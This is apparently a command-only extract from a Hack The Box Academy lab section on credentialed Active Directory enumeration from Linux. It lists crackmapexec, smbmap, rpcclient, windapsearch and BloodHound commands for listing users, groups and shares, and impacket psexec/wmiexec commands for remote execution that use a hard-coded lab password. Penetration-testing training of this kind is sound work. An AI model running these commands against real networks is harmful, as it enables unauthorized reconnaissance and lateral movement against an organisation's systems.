# Section 14: Credentialed Enumeration - from Linux

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1269
- Code/command blocks: 19

> Terminal output is omitted; only commands & scripts are captured.

```bash
crackmapexec -h
```

```bash
crackmapexec smb -h
```

```bash
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --users
```

```bash
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --groups
```

```bash
sudo crackmapexec smb 172.16.5.130 -u {{USERNAME}} -p {{PASSWORD}} --loggedon-users
```

```bash
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --shares
```

```bash
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M spider_plus --share 'Department Shares'
```

```bash
head -n 10 /tmp/cme_spider_plus/{{DC_IP}}.json 
```

```bash
smbmap -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN_UPPER}} -H {{DC_IP}}
```

```bash
smbmap -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN_UPPER}} -H {{DC_IP}} -R 'Department Shares' --dir-only
```

```bash
rpcclient -U "" -N {{DC_IP}}
```

```bash
impacket-psexec {{DOMAIN}}/wley:'transporter@4'@172.16.5.125
```

```bash
impacket-wmiexec {{DOMAIN}}/wley:'transporter@4'@{{DC_IP}}
```

```bash
windapsearch.py -h
```

```bash
python3 windapsearch.py --dc-ip {{DC_IP}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} --da
```

```bash
python3 windapsearch.py --dc-ip {{DC_IP}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -PU
```

```bash
bloodhound-python -h
```

```bash
sudo bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -ns {{DC_IP}} -d {{DOMAIN}} -c all 
```

```bash
ls
```

